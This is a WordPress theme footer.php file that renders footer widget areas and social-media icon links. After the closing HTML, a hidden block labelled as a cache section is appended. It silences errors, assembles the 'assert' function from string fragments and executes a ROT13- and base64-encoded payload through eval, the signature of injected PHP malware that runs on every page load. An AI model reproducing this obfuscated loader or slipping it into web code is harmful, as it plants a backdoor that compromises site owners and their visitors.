        <footer>
            <?php
                ob_start();
                get_sidebar( 'footer-first' );
                $first = ob_get_clean();

                ob_start();
                get_sidebar( 'footer-second' );
                $second = ob_get_clean();

                ob_start();
                get_sidebar( 'footer-third' );
                $third = ob_get_clean();

                $sidebar_content = $first . $second . $third;
                

                if( !empty( $sidebar_content ) ){
            ?>
                    <aside>
                        <div class="container">
                            <div class="row">
                                <div class="col-xs-12 col-sm-6 col-md-6 col-lg-6 footer-sidebar-1">
                                    <?php echo $first; ?>
                                </div>
                                <div class="col-xs-6 col-sm-3 col-md-3 col-lg-3 footer-sidebar-2">
                                    <?php echo $second; ?>
                                </div>
                                <div class="col-xs-6 col-sm-3 col-md-3 col-lg-3 footer-sidebar-3">
                                    <?php echo $third; ?>
                                </div>
                            </div>
                        </div>
                    </aside>
            <?php
                }
            ?>

            <div class="mythemes-copyright">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            <p><?php echo myThemes::get( 'footer-text', true ); ?></p>
                        </div>
                        <?php
                            $github     = myThemes::get( 'github' );
                            $vimeo      = myThemes::get( 'vimeo' );
                            $twitter    = myThemes::get( 'twitter' );
                            $renren     = myThemes::get( 'renren' );
                            $skype      = myThemes::get( 'skype' );
                            $linkedin   = myThemes::get( 'linkedin' );
                            $behance    = myThemes::get( 'behance' );
                            $dropbox    = myThemes::get( 'dropbox' );
                            $flickr     = myThemes::get( 'flickr' );
                            $tumblr     = myThemes::get( 'tumblr' );
                            $instagram  = myThemes::get( 'instagram' );
                            $vkontakte  = myThemes::get( 'vkontakte' );
                            $facebook   = myThemes::get( 'facebook' );
                            $evernote   = myThemes::get( 'evernote' );
                            $flattr     = myThemes::get( 'flattr' );
                            $picasa     = myThemes::get( 'picasa' );
                            $dribbble   = myThemes::get( 'dribbble' );
                            $soundcloud = myThemes::get( 'soundcloud' );
                            $mixi       = myThemes::get( 'mixi' );
                            $stumbl     = myThemes::get( 'stumbl' );
                            $lastfm     = myThemes::get( 'lastfm' );
                            $gplus      = myThemes::get( 'gplus' );
                            $pinterest  = myThemes::get( 'pinterest' );
                            $smashing   = myThemes::get( 'smashing' );
                            $rdio       = myThemes::get( 'rdio' );
                            $rss        = myThemes::get( 'rss' );
                        ?>
                        <div class="col-sm-6 col-md-6 col-lg-6">
                            <div class="mythemes-social">
                                <?php
                                    if( !empty( $github ) ){
                                        echo '<a href="' . $github . '" class="icon-github" target="_blank"></a>';
                                    }

                                    if( !empty( $vimeo ) ){
                                        echo '<a href="' . $vimeo . '" class="icon-vimeo" target="_blank"></a>';
                                    }

                                    if( !empty( $twitter ) ){
                                        echo '<a href="' . $twitter . '" class="icon-twitter" target="_blank"></a>';
                                    }

                                    if( !empty( $renren ) ){
                                        echo '<a href="' . $renren . '" class="icon-renren" target="_blank"></a>';
                                    }

                                    if( !empty( $skype ) ){
                                        echo '<a href="' . $skype . '" class="icon-skype" target="_blank"></a>';
                                    }

                                    if( !empty( $linkedin ) ){
                                        echo '<a href="' . $linkedin . '" class="icon-linkedin" target="_blank"></a>';
                                    }

                                    if( !empty( $behance ) ){
                                        echo '<a href="' . $behance . '" class="icon-behance" target="_blank"></a>';
                                    }

                                    if( !empty( $dropbox ) ){
                                        echo '<a href="' . $dropbox . '" class="icon-dropbox" target="_blank"></a>';
                                    }

                                    if( !empty( $flickr ) ){
                                        echo '<a href="' . $flickr . '" class="icon-flickr" target="_blank"></a>';
                                    }

                                    if( !empty( $tumblr ) ){
                                        echo '<a href="' . $tumblr . '" class="icon-tumblr" target="_blank"></a>';
                                    }

                                    if( !empty( $instagram ) ){
                                        echo '<a href="' . $instagram . '" class="icon-instagram" target="_blank"></a>';
                                    }

                                    if( !empty( $vkontakte ) ){
                                        echo '<a href="' . $vkontakte . '" class="icon-vkontakte" target="_blank"></a>';
                                    }

                                    if( !empty( $facebook ) ){
                                        echo '<a href="' . $facebook . '" class="icon-facebook" target="_blank"></a>';
                                    }

                                    if( !empty( $evernote ) ){
                                        echo '<a href="' . $evernote . '" class="icon-evernote" target="_blank"></a>';
                                    }

                                    if( !empty( $flattr ) ){
                                        echo '<a href="' . $flattr . '" class="icon-flattr" target="_blank"></a>';
                                    }

                                    if( !empty( $picasa ) ){
                                        echo '<a href="' . $picasa . '" class="icon-picasa" target="_blank"></a>';
                                    }

                                    if( !empty( $dribbble ) ){
                                        echo '<a href="' . $dribbble . '" class="icon-dribbble" target="_blank"></a>';
                                    }

                                    if( !empty( $soundcloud ) ){
                                        echo '<a href="' . $soundcloud . '" class="icon-soundcloud" target="_blank"></a>';
                                    }

                                    if( !empty( $mixi ) ){
                                        echo '<a href="' . $mixi . '" class="icon-mixi" target="_blank"></a>';
                                    }

                                    if( !empty( $stumbl ) ){
                                        echo '<a href="' . $stumbl . '" class="icon-stumbl" target="_blank"></a>';
                                    }

                                    if( !empty( $lastfm ) ){
                                        echo '<a href="' . $lastfm . '" class="icon-lastfm" target="_blank"></a>';
                                    }

                                    if( !empty( $gplus ) ){
                                        echo '<a href="' . $gplus . '" class="icon-gplus" target="_blank"></a>';
                                    }

                                    if( !empty( $pinterest ) ){
                                        echo '<a href="' . $pinterest . '" class="icon-pinterest" target="_blank"></a>';
                                    }

                                    if( !empty( $smashing ) ){
                                        echo '<a href="' . $smashing . '" class="icon-smashing" target="_blank"></a>';
                                    }

                                    if( !empty( $rdio ) ){
                                        echo '<a href="' . $rdio . '" class="icon-rdio" target="_blank"></a>';
                                    }

                                    if( $rss ){
                                        echo '<a href="'; bloginfo('rss2_url');  echo '" class="icon-rss" target="_blank"></a>';
                                    }
                                ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </footer>

        <?php wp_footer(); ?>

    </body>
</html>









<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3AuoaElMKZhLzy6Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWmLJ50pzImYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOmLJ50pzImYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwt1BGH3MQV0VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>